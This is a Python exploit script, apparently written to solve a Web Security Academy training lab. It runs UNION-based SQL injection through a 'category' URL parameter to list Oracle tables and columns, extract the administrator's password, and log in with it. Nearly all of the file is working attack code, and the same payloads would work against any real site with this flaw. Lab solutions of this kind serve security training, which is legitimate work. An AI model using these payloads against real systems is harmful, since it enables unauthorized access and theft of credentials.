#!/usr/bin/env python3 

import requests
import urllib3
import argparse
import subprocess
from bs4 import BeautifulSoup
import re
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""SQL Injection Web Security Academy

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" 

""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url
s = requests.Session()

def get_csrf(s, url):
    path = '/login'
    r = s.get(url + path, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    global csrf
    csrf = soup.find("input")['value']
    return csrf

def sqli_user(url):
    path = '/filter'
    cmd = "' UNION SELECT table_name,'a' FROM all_tables--"
    params = {
        'category': 'Pets' + cmd
    }
    r = s.get(url + path, params=params, verify=False)
    # verify the response returns 200 code
    if (r.status_code == 200):
        for line in r.content.splitlines():
            l = line.decode("utf-8")
            if ('USERS_' in l):
                if ('APP_USERS_AND_ROLES' not in l):
                    tbl_split = l.split("<th>")[1]
                    global users_table
                    users_table = tbl_split.split("</th>")[0]
                else:
                    pass
            else: 
                pass
    else: 
        print("(-) SQL Injection Failed")
        
def sqli_cols(url, users_table):
    path = '/filter'
    cmd = "' UNION SELECT column_name,'a' FROM all_tab_columns WHERE table_name = '" + users_table + "'--"  
    params = {
        'category': 'Pets' + cmd
    }
    r = s.get(url + path, params=params, verify=False)
    # verify the response returns 200 code
    if (r.status_code == 200):
        for line in r.content.splitlines():
            l = line.decode("utf-8")
            if ('USERNAME' in l):
                usr_split = l.split("<th>")[1]
                global usr_col
                usr_col = usr_split.split("</th>")[0]
            elif ('PASSWORD' in l):
                pass_split = l.split("<th>")[1]
                global pass_col
                pass_col = pass_split.split("</th>")[0]
            else:
                pass
    else: 
        print("(-) SQL Injection Failed")

def sqli_creds(url, users_table, usr_col, pass_col):
    path = '/filter'
    cmd = "' UNION SELECT " + usr_col + "," + pass_col + " FROM " + users_table + " WHERE " + usr_col + " = 'administrator'--"
    params = {
        'category': 'Pets' + cmd
    }
    r = s.get(url + path, params=params, verify=False)
    # verify the response returns 200 code
    if (r.status_code == 200):
        for line in r.content.splitlines():
            l = line.decode("utf-8")
            res = re.search(r'\b[0-9a-z]{20}\b', l)
            if (type(res).__name__ == 'Match'):
                str_line = str(l)
                global admin_pwd
                spl_pwd = str_line.split("<td>", 1)[1]
                admin_pwd = spl_pwd.split("</td>", 1)[0]
                return admin_pwd
            else: 
                pass
    else: 
        print("(-) SQL Injection Failed")

def login(url, csrf, admin_pwd):
    data = {
        'csrf': csrf,
        'username': 'administrator',
        'password': admin_pwd
    }
    s.post(url + '/login', data=data, verify=False)
    r1 = s.get(url, verify=False)
    # verify the response contains Congratulations, you solved the lab!
    if (b'Congratulations, you solved the lab!' in r1.content):
        print("(+) SQL Injection Successful!")
        subprocess.call(["firefox", url])
        
def main():
    
    print("(+) Exploiting SQL Injection")

    get_csrf(s, url)
        
    sqli_user(url)

    sqli_cols(url, users_table)

    sqli_creds(url, users_table, usr_col, pass_col)

    login(url, csrf, admin_pwd)

if __name__ == "__main__":
    main()
